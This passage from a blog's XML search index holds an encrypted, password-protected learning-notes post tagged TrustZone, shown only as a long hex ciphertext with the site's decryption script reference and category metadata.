ebc22123e5e6cf670dfb6a5a6fc5f8a7af6ea6c3f3696360154cc9d7a8b40e99e9dfcc50efce00dbb786bc54b9ddaa8a2802a0e14751e0b5e1ea7831509e3041c2c51a7188294f40a2b8674f5a42a79fc88c0e271fc8c4877985808989f27e95e7ae12d5fb572eff72aa7e64c3190ba5a73247bdcfd0df196c4f20ed9c983ff7efeaed4292552950a8ea48b76fcb430c51dcf8214b90ec45242fe0a46afbf1bf90fb786e792c0230be9489f852b3943dbb9a2f668205ef81d24749a32f484b33105405ad613ec3678ade370bde0ab1770f1c67b68808da8fb3e73eb2f364be01d4d022eb03d14b12a1aca3e7934683d67aa71826f8d0e46c8b0a40d7a5d73102c2d9370f0b3edafe5eed2b55cf5ae8379b44bee6538a4ca88aa31444068f6cda899e8744e65a0075ffa0f99abda1940bbc096a00dc77e072ef86e7df758bb7c92d56d88592709af30b3a8b2fb8367573475d1a86b9307039d7239c240819929ec9c51e19e073595a719e5d685032198c81f639bd43c23639a8dddd6a0f135b3f607106121d68099765c7ff886e31e84287786aa7409cd3a70fffc0c5d813492c9c7c3b8fb0cfad7b410efa5f42ccf5c3531845f20fd8390b6f99809aa09e79e5f39d440f93bf97e80e2200bed4b0b2af8ee0634ba6290bb2ec26bc33f325fb3f25832c287b4b3c324e4153a75932b0594a0e730bb5bb7b086adcc2b01b838cea975908a09689429a2841f82aa144b3f5355e8c8218b66498a99e2c8d85c5727888599dcc2470d237903af5fb8b2434cce2a5585b42d7d809ddd2914bdcb83d1928e08216dc900a5eb783149376116cfcc0f935f22064f708dbdfbe6cb8d06a98fcd611927a8a3cfdbe6a0a05fb6b202d7859ef3b867e9a697adbfac5575d7147daa5eb4dd36d2f09e43ec88f8973dab4aa24d1406b95593e6b550659a7cf580e396a79d096267ca08bf4844f41bcee798a8ae53a30997cef967ff8de22c6a57030b42bb3fcf8df2c089057e814ac7c4c46fc76749fa76021c96d243719273bcc15487122f599abef61feb6716c24c47333e0db24a75548f4ae5e372599a9422b3b9ad657da2d058e8d0ae617d3d105e27122bbf4cd4b2938188c3b2c6c19a082fcd477a4d9ac6cc32e1ba5338445bea30d5beea5f81ebafb6f9f272aff1d0395ce210b342a0e9fb2daf658783b4769ec2f5e98798338fc46dbfa0551cfb2800e2cd88ed6475b6eb9254fe74e17aae4a1bb512e99ebdea0f8c7d9ef4cd5127e2934bd3ad2800d85aa0927334d1acab6cd4d6adbcaf375ad20cd626526f7241759e5093e22401ec0f8076c040dc7a41604cda3d127e3224352373af1e24be4f0028930c4bb7a60ae4c07a3bf28b34cc3a82b6fcd94063b0ab65fa08b615f8d82d0c7dc2e9f2e09f592a1144f39f7464f802bb095eebec2bfb87542e9a41f9ae500d639c6a469a48a0ecfddf01288e1d931d8e21f9ff79c8d27d869feb527b0b898d5684407f770bf885375e75eaa326e96dced0e8a53b760e4062981d941d5847762b9bbb1cd7eac409b19eb47bb77d4686a4043350a1ee8b9037f6aeb98692887f2f77ccd349a32ad3f9b8a1763d0e37732d0344efb43dd9db415c9bc67d673d962781ef2fb698b304703908a7f8e29c69de93876193864b1c8fe7d0230e23d5acdd78839b6ad0c23029114c341500458da93222b34f10953fb6cc5dc9e226c686b37f9c3538ab3a4cb9fd238462901ee2b22befe60b57192bd1c063de2b83685d0d47f630053260ba7bd2bfd0de26451b859e0677c02594a44fde78a605527e41865d553365e9d9ef8c493e2ffe829bd7d7319daffe58ab70636e182de33c1d1f4fd7b37965efed2b1ddee8c16a81fb9f774392a0f4a589d7049e9010c93ba286d6aeae914836e265db0b2a9902a29a1ee5f3f034a795160fc9bbbc2551a3c014acc7b8c67a4cb3ebfd009615a93a763570007156a0168a52df259e4c30c4752a8628c5a244dd701d44e7bef502564fc17b83fbea0dfc6da874d409fd4dc93a48c56f4dc6e6a175fcf7a626f3e3545781596b91aac3629613063c37d864a7d4b9f1ffe3de46230a9e0ef813cd80a8caeabb0d66f24ddda9f0ab715bfcabd6ea722b4cd5281d540ce9b14c53fb6e416962cb0803b6dcfc26dc3a91dd4db33dfbea2c54c4e5c30abe4f4e10ae44b1c4e451dad70e64f5be030707ee4d2e0bab524c82e17c794d2801d56020b3f4932a83d21a56ba3e61fe982ca3512652a140b78be13a1fecd81822096bea398ba0e765f6cd8b3c42554e6a98c069a52fcd6de0482abec4bebde752982a81990a41ddc3ada5c3cbdfe900a67f30214e2554a96e5aab0dc2d7ea206a213c45f8429a404af1efa4105466802ab706be53a040891f7a1a830f0fe8a9fd39a0581c4792743a17ab67b7dfcadbad932b408160191f3bd5342de5adee4863c75e818ce700b63e17c7d4f0f2f6e7b6320a88c8989bb85db8257bbbe38ae6469065bd38405e85e1a32da2d8c0f083884a5c344bb752c09fb66bb08c0390563d1bb367af8d3057c185499cef54f275d2596249ce79daaefda9e7471a9d488a65ee83811c4de1efe60e088dd04bcc77133c20712909746d7c013617fe457c9691fc00527bf0e0c1424686068c2867fdac36f821520a238bd77c88dc096eaf43bb09bc74732a53428ceffb0dc21bd857eee5b3ad53eb23164dfa5ac01d721e0a1ab07f2a73f51fe61e1bc50c4263aa9a12d095353a175b1b1c992e3b9d05be1e126c8c88b2bda88fc33d6ddcbddd10cbd502232cc722297748f891e7bf89ac4bdfcf96a352e7343f3b980f4a3be4015e210bb5ffe3f15b7ccc0e7bd398b44a006a2f36d06be933721356850dd33c4180eb5fb66c4c9875a756e7229e1d8b411a271982b363c92588</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> LearningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TrustZone </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
